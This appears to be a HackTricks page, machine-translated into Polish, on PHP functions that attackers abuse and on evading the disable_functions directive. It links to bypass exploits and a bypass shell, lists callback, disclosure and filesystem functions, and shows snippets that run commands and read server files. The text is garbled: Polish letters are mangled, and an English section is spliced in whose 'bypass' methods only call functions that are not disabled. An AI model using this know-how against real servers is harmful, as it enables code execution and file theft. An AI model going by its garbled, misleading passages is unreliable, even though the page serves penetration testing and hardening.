* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 Exploit FOpen**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Automatyczne narzdzie**

Nastpujcy skrypt pr贸buje kilku z om贸wionych tutaj metod:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Inne interesujce funkcje PHP

### Lista funkcji akceptujcych wywoania zwrotne

Te funkcje akceptuj parametr w postaci cigu znak贸w, kt贸ry mo偶e by u偶yty do wywoania funkcji wybranej przez atakujcego. W zale偶noci od funkcji atakujcy mo偶e mie lub nie mie mo偶liwo przekazania parametru. W takim przypadku mo偶na u偶y funkcji ujawniania informacji, takiej jak phpinfo().

[Wywoania zwrotne / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Poni偶sze listy pochodz std](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```

### Ujawnienie informacji

Wikszo tych wywoa funkcji nie jest 藕r贸dem zagro偶enia. Jednak mo偶e to by podatno, jeli jakiekolwiek zwracane dane s widoczne dla atakujcego. Jeli atakujcy mo偶e zobaczy phpinfo(), jest to zdecydowanie podatno.

```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```

### Inne

The `disable_functions` directive in PHP allows you to disable certain functions for security reasons. However, it is possible to bypass this restriction using various techniques.

#### Bypassing `disable_functions`

1. **Using `system` function**: If the `system` function is not disabled, you can use it to execute arbitrary commands. For example, you can execute `phpinfo()` by running `system('php -r "phpinfo();"')`.
2. **Using `shell_exec` function**: Similar to the `system` function, if `shell_exec` is not disabled, you can use it to execute commands. For example, you can execute `phpinfo()` by running `shell_exec('php -r "phpinfo();"')`.
3. **Using `exec` function**: If the `exec` function is not disabled, you can use it to execute commands. For example, you can execute `phpinfo()` by running `exec('php -r "phpinfo();"')`.
4. **Using `popen` function**: If the `popen` function is not disabled, you can use it to execute commands. For example, you can execute `phpinfo()` by running `popen('php -r "phpinfo();"', 'r')`.
5. **Using `proc_open` function**: If the `proc_open` function is not disabled, you can use it to execute commands. For example, you can execute `phpinfo()` by running the following code:

```php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open('php -r "phpinfo();"', $descriptorspec, $pipes);

if (is_resource($process)) {
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
```

6. **Using `passthru` function**: If the `passthru` function is not disabled, you can use it to execute commands. For example, you can execute `phpinfo()` by running `passthru('php -r "phpinfo();"')`.
7. **Using `eval` function**: If the `eval` function is not disabled, you can use it to execute arbitrary PHP code. For example, you can execute `phpinfo()` by running `eval('phpinfo();')`.
8. **Using `assert` function**: If the `assert` function is not disabled, you can use it to execute arbitrary PHP code. For example, you can execute `phpinfo()` by running `assert('phpinfo();')`.
9. **Using `create_function` function**: If the `create_function` function is not disabled, you can use it to create a function that executes arbitrary PHP code. For example, you can execute `phpinfo()` by running the following code:

```php
$func = create_function('', 'phpinfo();');
$func();
```

10. **Using `include` or `require` functions**: If the `include` or `require` functions are not disabled, you can use them to include a file that contains the desired code. For example, you can create a file named `payload.php` with the following content:

```php
<?php
phpinfo();
?>
```

And then include it by running `include('payload.php')` or `require('payload.php')`.

#### Conclusion

By using the techniques mentioned above, you can bypass the `disable_functions` directive in PHP and execute arbitrary code. However, it is important to note that these techniques should only be used for educational and ethical purposes, such as penetration testing or securing your own systems.

```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```

### Funkcje systemu plik贸w

Wedug RATS wszystkie funkcje systemu plik贸w w PHP s niebezpieczne. Niekt贸re z nich wydaj si niezbyt przydatne dla atakujcego. Inne s bardziej przydatne, ni偶 mogoby si wydawa. Na przykad, jeli allow\_url\_fopen=On, to adres URL mo偶na u偶y jako cie偶k pliku, wic wywoanie copy($\_GET\['s'], $\_GET\['d']); mo偶na u偶y do przesania skryptu PHP w dowolne miejsce w systemie. Ponadto, jeli strona jest podatna na 偶danie wysane za pomoc GET, ka偶da z tych funkcji systemu plik贸w mo偶e by wykorzystana do przekierowania ataku na inny host przez Twoje serwery.

**Otw贸rz obsug systemu plik贸w**

```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```

**Zapis do systemu plik贸w (czciowo w poczeniu z odczytem)**

W niekt贸rych przypadkach, podczas testowania penetracyjnego aplikacji internetowych napisanych w PHP, mo偶e by konieczne przeprowadzenie operacji zapisu do systemu plik贸w. Mo偶e to obejmowa tworzenie, modyfikacj lub usuwanie plik贸w na serwerze.

Jedn z metod, kt贸re mo偶na wykorzysta do zapisu plik贸w, jest wykorzystanie funkcji PHP, takich jak `file_put_contents()` lub `fwrite()`. Te funkcje umo偶liwiaj zapisanie danych do pliku na serwerze.

Przykad u偶ycia funkcji `file_put_contents()`:

```php
<?php
$file = 'path/to/file.txt';
$data = 'Some data to write to the file';

file_put_contents($file, $data);
?>
```

W powy偶szym przykadzie, funkcja `file_put_contents()` zapisuje zawarto zmiennej `$data` do pliku o cie偶ce `$file`.

W niekt贸rych przypadkach, aby przeprowadzi operacj zapisu do systemu plik贸w, mo偶e by konieczne wczeniejsze odczytanie zawartoci istniejcego pliku. Mo偶na to zrobi za pomoc funkcji PHP, takich jak `file_get_contents()` lub `fread()`.

Przykad u偶ycia funkcji `file_get_contents()`:

```php
<?php
$file = 'path/to/file.txt';

$data = file_get_contents($file);

echo $data;
?>
```

W powy偶szym przykadzie, funkcja `file_get_contents()` odczytuje zawarto pliku o cie偶ce `$file` i przypisuje j do zmiennej `$data`. Nastpnie zawarto pliku jest wywietlana za pomoc funkcji `echo`.

Wa偶ne jest, aby pamita, 偶e operacje zapisu do systemu plik贸w mog by ryzykowne i powinny by przeprowadzane tylko w celach testowych i zgodnie z prawem.

```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```

**Odczyt z systemu plik贸w**

W niekt贸rych przypadkach podczas testowania penetracyjnego aplikacji internetowych nara偶onej na PHP, mo偶e by konieczne odczytanie zawartoci plik贸w z systemu plik贸w. Mo偶e to by przydatne, na przykad, gdy chcemy uzyska dostp do plik贸w konfiguracyjnych lub innych poufnych informacji przechowywanych na serwerze.

Aby odczyta zawarto plik贸w z systemu plik贸w, mo偶emy skorzysta z funkcji PHP, takich jak `file_get_contents()` lub `readfile()`. Te funkcje pozwalaj na odczytanie zawartoci pliku i przekazanie jej do naszego kodu.

Przykad u偶ycia funkcji `file_get_contents()`:

```php
$fileContent = file_get_contents('/cie偶ka/do/pliku');
echo $fileContent;
```

Przykad u偶ycia funkcji `readfile()`:

```php
readfile('/cie偶ka/do/pliku');
```

Wa偶ne jest, aby pamita, 偶e odczyt z systemu plik贸w mo偶e by nielegalny i narusza prywatno lub bezpieczestwo. Nale偶y zawsze przestrzega prawnych i etycznych zasad podczas testowania penetracyjnego i uzyskiwania dostpu do plik贸w z systemu plik贸w.

```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
